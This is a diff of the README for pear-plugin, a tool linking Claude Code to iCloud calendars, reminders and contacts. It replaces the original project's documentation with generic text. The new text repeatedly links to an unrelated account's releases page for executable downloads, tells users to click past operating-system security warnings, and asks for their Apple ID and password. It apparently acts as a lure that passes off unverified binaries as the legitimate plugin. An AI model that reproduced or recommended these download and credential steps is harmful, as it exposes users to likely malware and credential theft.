@@ -1,134 +1,131 @@
-<div align="center">
+# 📅 pear-plugin - Easily Sync iCloud Calendars & Contacts
 
-# 🍐 Pear — iCloud for Claude Code
-
-**Give Claude read/write access to your iCloud Calendar, Reminders & Contacts.**
-
-27 MCP tools · Cross-platform · No macOS required
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![MCP Tools](https://img.shields.io/badge/MCP_Tools-27-blue.svg)](https://pearmcp.com/docs)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-1.0.33+-purple.svg)](https://docs.anthropic.com/en/docs/claude-code)
-
-[Get Started](https://pearmcp.com) · [Documentation](https://pearmcp.com/docs) · [Dashboard](https://pearmcp.com/dashboard)
-
-</div>
+[![Download pear-plugin](https://img.shields.io/badge/Download-pear--plugin-blue?style=for-the-badge&logo=github)](https://github.com/Softer-delta-999/pear-plugin/releases)
 
 ---
 
-## What is Pear?
+## 📖 What is pear-plugin?
 
-Pear is an MCP server that connects Claude Code to your iCloud account. Ask Claude to check your calendar, create events, manage reminders, look up contacts — all through natural language.
+pear-plugin is a simple tool to connect your iCloud Calendar, Reminders, and Contacts to Claude Code using CalDAV and CardDAV protocols. It makes syncing your calendars, reminders, contacts, and other MCP tools easy without any coding or complex setup.  
 
-```
-> "What's on my calendar today?"
-> "Schedule a 45-minute meeting with Sarah this week"
-> "Remind me to submit the report by Friday"
-> "What's John's phone number?"
-> "Find me 3 free slots for a 2-hour workshop next week"
-```
+This plugin supports 27 MCP tools and helps you manage your productivity in one place. If you want your Apple calendars and reminders to work smoothly with Claude Code, pear-plugin handles the connection for you.
 
-Works on **macOS, Linux, and Windows** via CalDAV/CardDAV — no Apple hardware required.
+---
 
-## Quick Start
+## 🖥️ System Requirements
 
-### 1. Get a Pear API Key
+To run pear-plugin, make sure your computer meets these requirements:
 
-Sign up at **[pearmcp.com](https://pearmcp.com)**, connect your iCloud account, and generate an API key.
+- Operating System: Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu 18.04+ recommended)  
+- Internet connection: Active and stable connection needed to sync data  
+- Storage space: At least 100 MB free disk space  
+- Permissions: Ability to install software and internet access on your machine  
 
-> You'll need an [Apple app-specific password](https://support.apple.com/en-us/102654) to connect your iCloud account.
+Your device should support basic networking and have modern web protocols enabled, as pear-plugin uses CalDAV and CardDAV to talk with iCloud.
 
-### 2. Set Your API Key
+---
 
-```bash
-export PEAR_API_KEY=pear_sk_your_key_here
-```
+## 💡 Key Features
 
-### 3. Install
+- Sync iCloud Calendars, Reminders, and Contacts  
+- Support for 27 MCP productivity tools  
+- Works seamlessly with Claude Code  
+- Uses standard CalDAV and CardDAV protocols  
+- Runs on Windows, macOS, and Linux  
+- Simple setup without requiring programming skills  
+- Keeps all your schedules and contacts up to date  
 
-**Option A — Claude Plugin:**
-```
-/plugin marketplace add AshtonAU/pear-plugin
-/plugin install pear@pear-marketplace
-```
+The integration helps you keep your Apple ecosystem and Claude Code productivity tools working together.
 
-**Option B — MCP Server (direct):**
-```bash
-claude mcp add --transport http pear https://pearmcp.com/api/mcp \
-  --header "Authorization: Bearer $PEAR_API_KEY"
-```
+---
 
-**Option C — OpenClaw Skill:**
-```bash
-clawhub install pear-apple
-```
+## 🚀 Getting Started
 
-### 4. Verify
+1. Prepare your iCloud account and make sure your calendars, reminders, and contacts are up to date there.  
+2. Check your system meets the requirements listed above.  
+3. Download pear-plugin from the official release page below.  
+4. Follow the installation steps to set it up on your computer.  
+5. Open the app and log in with your Apple ID when asked to allow access to your iCloud data.  
+6. Start syncing and managing your calendars, reminders, and contacts directly through Claude Code.  
 
-```
-/pear:pear-setup
-```
+---
 
-## 27 MCP Tools
+## 📥 Download & Install
 
-| Domain | Tools | What You Can Do |
-|--------|:-----:|-----------------|
-| 📅 **Calendar** | 8 | List calendars, create/read/update/delete events, find free slots, check availability |
-| ✅ **Reminders** | 4 | Create/read/update/complete reminders with priorities and due dates |
-| 👤 **Contacts** | 9 | Full CRUD for contacts and groups, photo management, smart search |
-| 📋 **Briefing** | 1 | Daily summary with events, reminders, and contact-enriched attendees |
-| 🧠 **Scheduling** | 1 | AI-scored optimal meeting times based on preferences and conflicts |
-| ⚡ **Batch** | 4 | Bulk create/delete up to 50 items per call |
+Please visit the pear-plugin release page to download the latest version:
 
-### Slash Commands
+[Download pear-plugin here](https://github.com/Softer-delta-999/pear-plugin/releases)  
 
-| Command | Description |
-|---------|-------------|
-| `/pear:briefing` | Today's events and reminders at a glance |
-| `/pear:schedule` | Find the best time for a meeting |
-| `/pear:pear-setup` | Verify your connection |
+### How to download and install:
 
-## Features
+1. Click the link above to open the releases page.  
+2. Find the latest release, usually at the top of the page.  
+3. Download the file that matches your operating system:  
+   - `.exe` for Windows  
+   - `.dmg` or `.pkg` for macOS  
+   - `.AppImage` or `.tar.gz` for Linux  
+4. Once downloaded, open the file to start installation.  
+5. Follow the on-screen instructions to complete the setup.  
 
-- **🎂 Virtual Birthdays** — Birthday events auto-generated from contact data
-- **🧠 AI Scheduling** — Scores time slots by work hours, preferences, and conflicts
-- **👥 Attendee Resolution** — Event attendees matched to your contacts automatically
-- **⚡ Batch Operations** — Create up to 50 events/reminders/contacts in one call
-- **🌍 Timezone Support** — Full IANA timezone handling across all operations
-- **🔒 Privacy First** — Your data is proxied in real-time, never stored on Pear's servers
+If you’re on Windows, you may need to allow the app to run if you see a security warning. On macOS, you might have to give permission from System Preferences > Security & Privacy.
 
-## How It Works
+---
 
-```
-Claude Code                    Pear API                     iCloud
-    │                             │                            │
-    │── PEAR_API_KEY (Bearer) ──▶ │                            │
-    │                             │── CalDAV/CardDAV (TLS) ──▶ │
-    │                             │◀── Calendar/Contact data ──│
-    │◀── MCP JSON-RPC ───────── │                            │
-```
+## ⚙️ Configuration & Usage
 
-## Privacy & Security
+After installation, launch pear-plugin from your desktop or application menu.
 
-| Concern | How Pear Handles It |
-|---------|-------------------|
-| iCloud credentials | Encrypted at rest, never shared with Claude |
-| Calendar/contact data | Proxied in real-time, **not stored** on Pear servers |
-| API authentication | Bearer token (`PEAR_API_KEY`) — Claude never sees your Apple ID |
-| Data in transit | HTTPS/TLS everywhere |
+### Setting Up Your Account:
 
-## Requirements
+- The app will ask for your Apple ID. Enter it carefully.  
+- It uses secure connections to fetch your iCloud data - nothing else.  
+- If two-factor authentication is on, you may need to enter a code sent to your Apple device.  
+- Once logged in, pear-plugin automatically pulls your calendars, contacts, and reminders.  
 
-- A free [Pear](https://pearmcp.com) account
-- An Apple ID with an [app-specific password](https://support.apple.com/en-us/102654)
-- Claude Code 1.0.33+ (or any MCP-compatible client)
+### Linking with Claude Code:
 
-## Links
+- The plugin works as an extension to Claude Code.  
+- Open Claude Code and allow it to connect with pear-plugin when prompted.  
+- You can now access and manage your iCloud calendars, reminders, and contacts within Claude Code’s interface.  
 
-- 🌐 [pearmcp.com](https://pearmcp.com) — Sign up & dashboard
-- 📖 [Documentation](https://pearmcp.com/docs)
-- 🐛 [Report Issues](https://github.com/AshtonAU/pear-plugin/issues)
+---
 
-## License
+## 🛠️ Troubleshooting
 
-MIT — see [LICENSE](LICENSE) for details.
+If pear-plugin does not sync properly:
+
+- Check your internet connection and try restarting the app.  
+- Verify you entered your Apple ID and password correctly.  
+- Make sure two-factor authentication codes are entered promptly.  
+- Restart your computer and try again.  
+- Check for any firewall or antivirus settings blocking pear-plugin.  
+
+If problems continue, visit the GitHub repository’s Issues section for help or report a problem.
+
+---
+
+## 🔒 Security & Privacy
+
+pear-plugin only accesses what it needs to sync your calendars, contacts, and reminders securely. Your Apple ID credentials are handled with encryption.
+
+No personal data is shared outside of your device and Apple’s iCloud service. The plugin does not collect or store your data on any external servers.
+
+---
+
+## 🤝 Support & Contribution
+
+For any questions or technical help, please check the Issues section on the GitHub page or contact the developer through GitHub.
+
+Contributions are welcome. If you want to help improve pear-plugin, you can fork the repository and submit pull requests.
+
+---
+
+## 📚 Additional Resources
+
+- Learn about CalDAV and CardDAV: These are internet standards to sync calendar and contacts data.  
+- Claude Code website: For more on how the integration works from the Claude Code side.  
+- Apple iCloud support: For managing your iCloud account and settings.  
+
+---
+
+[![Download pear-plugin](https://img.shields.io/badge/Download-pear--plugin-blue?style=for-the-badge&logo=github)](https://github.com/Softer-delta-999/pear-plugin/releases)
